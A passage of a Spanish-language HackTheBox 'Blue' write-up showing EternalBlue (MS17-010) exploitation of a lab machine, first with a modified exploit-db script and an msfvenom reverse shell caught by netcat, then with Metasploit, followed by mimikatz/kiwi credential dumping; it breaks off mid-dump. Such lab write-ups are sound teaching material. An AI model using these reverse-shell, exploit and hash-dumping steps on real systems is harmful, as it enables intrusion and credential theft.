+</span></span><span style="display:flex;"><span>  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - <span style="color:#e6db74">&#39;EternalBlue&#39;</span> SMB Remote Code Execution <span style="color:#f92672">(</span>MS17-010<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/42315
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
+</span></span><span style="display:flex;"><span>    Codes: CVE-2017-0144
+</span></span><span style="display:flex;"><span> Verified: True
+</span></span><span style="display:flex;"><span>File Type: Python script, ASCII text executable
+</span></span></code></pre></div><p>Como tal, no viene información sobre como usarlo, menciona que debemos usar otro script llamado <strong>mysmb.py</strong>, quiza si buscamos en internet, podamos encontrar algo útil.</p>
+<p>Y justo nos sale un GitHub con el Exploit que vamos a usar:</p>
+<ul>
+<li><a href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit" target="_blank">Repositorio de AnikateSawhney: Pwning_Blue_From_HTB_Without_Metasploit</a></li>
+</ul>
+<p>Leyéndolo un poco, menciona que este Exploit necesita usar un entorno virtual en <strong>Python2</strong>, aunque realmente no es necesario si es que tienes instalado <strong>Python2</strong> en tu entorno, así que solamente evitaremos ese paso.</p>
+<p>Vamos a configurar el Exploit por pasos.</p>
+<ul>
+<li>Cambiando nombre de Exploit (opcional):</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mv 42315.py Eternal_Blue.py
+</span></span></code></pre></div><ul>
+<li>Descargando <strong>mysmb.py</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit/main/mysmb.py
+</span></span></code></pre></div><ul>
+<li>Creando <strong>Reverse Shell</strong> con <strong>Msfvenom</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp -f exe LHOST<span style="color:#f92672">=</span>Tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> &gt; eternal-blue.exe
+</span></span></code></pre></div><ul>
+<li>Modificando el Exploit con algunos datos:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>USERNAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;guest&#39;</span>
+</span></span><span style="display:flex;"><span>ANTES: smb_send_file<span style="color:#f92672">(</span>smbConn, sys.argv<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#e6db74">&#39;/exploit.py&#39;</span><span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>DESPUES: smb_send_file<span style="color:#f92672">(</span>smbConn, <span style="color:#e6db74">&#39;/Path_Donde_Esta_El_Reverse_Shell/eternal-blue.exe&#39;</span> <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#e6db74">&#39;/eternal-blue.exe&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>ANTES: service_exec<span style="color:#f92672">(</span>conn, r<span style="color:#e6db74">&#39;cmd /c copy c:\pwned.txt c:\pwned_exec.txt&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DESPUES: service_exec<span style="color:#f92672">(</span>conn, r<span style="color:#e6db74">&#39;cmd /c c:\eternal-blue.exe&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Una vez ya listo, vamos a activar una <strong>netcat</strong> que es ahí donde se conectara el script y luego lo activamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Activando script:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 Exploit_Blue.py 10.10.10.40
+</span></span><span style="display:flex;"><span>Target OS: Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Using named pipe: samr
+</span></span><span style="display:flex;"><span>Target is <span style="color:#ae81ff">64</span> bit
+</span></span><span style="display:flex;"><span>Got frag size: 0x10
+</span></span><span style="display:flex;"><span>GROOM_POOL_SIZE: 0x5030
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Done
+</span></span></code></pre></div><ul>
+<li>Resultado en <strong>netcat</strong>:</li>
+</ul>
+<pre tabindex="0"><code>nc -nvlp 443
+listening on [any] 443 ...
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+</code></pre><p>Excelente, ya solamente nos falta probar con el <strong>Metasploit Framework</strong>.</p>
+<h3 id="exploit3">Probando EternalBlue en Metasploit Framework</h3>
+<p>Primero debemos entrar a la consola de <strong>Metasploit</strong> y buscaremos el Exploit <strong>eternal blue</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>search eternalblue
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                      Disclosure Date  Rank     Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                      ---------------  ----     -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+</span></span></code></pre></div><p>Vamos a ocupar el escaner para saber si es vulnerable al eternal blue y luego usaremos el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use auxiliary/scanner/smb/smb_ms17_010
+</span></span></code></pre></div><p>Y veamos que necesita este modulo para funcionar correctamente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>show options
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>auxiliary/scanner/smb/smb_ms17_010<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name         Current Setting                                                 Required  Description
+</span></span><span style="display:flex;"><span>   ----         ---------------                                                 --------  -----------
+</span></span><span style="display:flex;"><span>   CHECK_ARCH   true                                                            no        Check <span style="color:#66d9ef">for</span> architecture on vulnerable hosts
+</span></span><span style="display:flex;"><span>   CHECK_DOPU   true                                                            no        Check <span style="color:#66d9ef">for</span> DOUBLEPULSAR on vulnerable hosts
+</span></span><span style="display:flex;"><span>   CHECK_PIPE   false                                                           no        Check <span style="color:#66d9ef">for</span> named pipe on vulnerable hosts
+</span></span><span style="display:flex;"><span>   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+</span></span><span style="display:flex;"><span>   RHOSTS                                                                       yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span><span style="display:flex;"><span>   RPORT        <span style="color:#ae81ff">445</span>                                                             yes       The SMB service port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SMBDomain    .                                                               no        The Windows domain to use <span style="color:#66d9ef">for</span> authentication
+</span></span><span style="display:flex;"><span>   SMBPass                                                                      no        The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>   SMBUser                                                                      no        The username to authenticate as
+</span></span><span style="display:flex;"><span>   THREADS      <span style="color:#ae81ff">1</span>                                                               yes       The number of concurrent threads <span style="color:#f92672">(</span>max one per host<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Necesitamos unicamente meter la IP de la máquina víctima y como conocemos el usuario, vamos a meterlo también:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set RHOSTS 10.10.10.40
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>set SMBUser guest
+</span></span></code></pre></div><p>Y lo ejecutamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exploit
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445       - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module execution completed
+</span></span></code></pre></div><p>Excelente, nos menciona que si es probablemente vulnerable, entonces usemos el modulo del Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use exploit/windows/smb/ms17_010_eternalblue
+</span></span></code></pre></div><p>Veamos las opciones:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name           Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----           ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   RHOSTS                          yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span><span style="display:flex;"><span>   RPORT          <span style="color:#ae81ff">445</span>              yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SMBDomain                       no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The Windows domain to use <span style="color:#66d9ef">for</span> authentication. Only affects Windows Server <span style="color:#ae81ff">2008</span> R2, Windows 7, Windows Embedded Standard <span style="color:#ae81ff">7</span> target machines.
+</span></span><span style="display:flex;"><span>   SMBPass                         no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>   SMBUser                         no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The username to authenticate as
+</span></span><span style="display:flex;"><span>   VERIFY_ARCH    true             yes       Check <span style="color:#66d9ef">if</span> remote architecture matches exploit Target. Only affects Windows Server <span style="color:#ae81ff">2008</span> R2, Windows 7, Windows Embedded Standard <span style="color:#ae81ff">7</span> target machines.
+</span></span><span style="display:flex;"><span>   VERIFY_TARGET  true             yes       Check <span style="color:#66d9ef">if</span> remote OS matches exploit Target. Only affects Windows Server <span style="color:#ae81ff">2008</span> R2, Windows 7, Windows Embedded Standard <span style="color:#ae81ff">7</span> target machines.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  thread           yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     X.X.X.X  yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Automatic Target
+</span></span></code></pre></div><p>Igual, necesitamos la IP de la máquina víctima, el usuario y recuerda verificar tu IP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set RHOSTS 10.10.10.40
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>set SMBUser guest
+</span></span></code></pre></div><p>Y ejecutamos el modulo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exploit
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on X.X.X.X:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445       - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Connecting to target <span style="color:#66d9ef">for</span> exploitation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - Connection established <span style="color:#66d9ef">for</span> exploitation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - Target OS selected valid <span style="color:#66d9ef">for</span> OS indicated by SMB reply
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - CORE raw buffer dump <span style="color:#f92672">(</span><span style="color:#ae81ff">42</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - 0x00000000  <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">69</span> 6e <span style="color:#ae81ff">64</span> 6f <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">72</span> 6f <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">73</span>  Windows <span style="color:#ae81ff">7</span> Profes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - 0x00000010  <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">69</span> 6f 6e <span style="color:#ae81ff">61</span> 6c <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">76</span>  sional <span style="color:#ae81ff">7601</span> Serv
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - 0x00000020  <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">63</span> 6b <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">31</span>                    ice Pack <span style="color:#ae81ff">1</span>      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - Target arch selected valid <span style="color:#66d9ef">for</span> arch indicated by DCE/RPC reply
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Trying exploit with <span style="color:#ae81ff">12</span> Groom Allocations.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Sending all but last fragment of exploit packet
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Starting non-paged pool grooming
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - Sending SMBv2 buffers
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Sending final SMBv2 buffers.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Sending last fragment of exploit packet!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Receiving response from exploit packet
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully <span style="color:#f92672">(</span>0xC000000D<span style="color:#f92672">)</span>!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Sending egg to corrupted connection.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.10.40:445 - Triggering free of corrupted buffer.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">200774</span> bytes<span style="color:#f92672">)</span> to 10.10.10.40
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>X.X.X.X:4444 -&gt; 10.10.10.40:49158<span style="color:#f92672">)</span> -0600
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-WIN-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.10.40:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer        : HARIS-PC
+</span></span><span style="display:flex;"><span>OS              : Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>6.1 Build 7601, Service Pack 1<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Architecture    : x64
+</span></span><span style="display:flex;"><span>System Language : en_GB
+</span></span><span style="display:flex;"><span>Domain          : WORKGROUP
+</span></span><span style="display:flex;"><span>Logged On Users : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Meterpreter     : x64/windows
+</span></span></code></pre></div><p>Listo, hemos obtenido acceso a la máquina de 3 formas distintas, es momento de ver que podemos hacer en las <strong>Post Explotación</strong>.</p>
+<h2 id="Post">Post Explotación</h2>
+<p>En esta parte, vamos a recolectar información útil del sistema tanto en el <strong>Metasploit Framework</strong> como de forma libre.</p>
+<h3 id="mimik">Dumpeando Hashes con Módulo Kiwi en Metasploit Framework</h3>
+<p>Para usarlo, debemos cargar el <strong>módulo Kiwi</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; load kiwi
+</span></span><span style="display:flex;"><span>Loading extension kiwi...
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 <span style="color:#ae81ff">20191125</span> <span style="color:#f92672">(</span>x64/windows<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#75715e">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;## v ##&#39;</span>        Vincent LE TOUX            <span style="color:#f92672">(</span> vincent.letoux@gmail.com <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Success.
+</span></span></code></pre></div><p>El <strong>módulo Kiwi</strong>, nos permite varias cosillas pues trabaja con <strong>mimikatz</strong>, pero lo más importante es que nos ayuda a obtener las <strong>credenciales de los usuarios registrados, los hashes de SAM y los LSA_SECRETS</strong>.</p>
+<ul>
+<li><strong>Dumpeando Credenciales</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; creds_all
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving all credentials
+</span></span><span style="display:flex;"><span>msv credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username       Domain    NTLM                              SHA1
+</span></span><span style="display:flex;"><span>--------       ------    ----                              ----
+</span></span><span style="display:flex;"><span>Administrator  haris-PC  cdf51b162460b7d5bc898f493751a0cc  dff1521f5f2d7436a632d26f079021e9541aba66
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wdigest credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===================</span>
